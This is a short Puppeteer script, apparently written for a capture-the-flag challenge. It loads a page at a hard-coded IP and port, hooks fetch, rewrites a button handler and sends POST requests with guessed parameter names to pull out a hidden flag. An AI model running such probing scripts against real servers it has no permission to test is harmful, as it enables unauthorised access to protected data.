const puppeteer = require('puppeteer');

(async () => {
  const browser = await puppeteer.launch({ headless: true });
  const page = await browser.newPage();
  
  // Override the fetch to see what happens
  await page.evaluateOnNewDocument(() => {
    const originalFetch = window.fetch;
    window.fetch = function(...args) {
      console.log('Fetch called with:', args);
      return originalFetch.apply(this, args);
    };
  });
  
  try {
    await page.goto('http://49.213.52.6:6969/');
    await new Promise(resolve => setTimeout(resolve, 1000));
    
    // Try modifying the button click to use flagdaw instead
    await page.evaluate(() => {
      const button = document.getElementById('button');
      button.onclick = async function() {
        const flag = await fetch('/', {
          method: 'POST',
          body: JSON.stringify({ flagdaw: true }),
        }).then((r) => r.text());
        alert(flag);
      };
    });
    
    page.on('dialog', async dialog => {
      console.log('Alert:', dialog.message());
      await dialog.accept();
    });
    
    await page.click('#button');
    await new Promise(resolve => setTimeout(resolve, 2000));
    
    // Also try with flagDaw but different approach
    const response2 = await page.evaluate(async () => {
      const res = await fetch('/', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({ flagDaw: true })
      });
      return await res.text();
    });
    console.log('Response with application/json:', response2);
    
  } catch (error) {
    console.error('Error:', error);
  } finally {
    await browser.close();
  }
})();

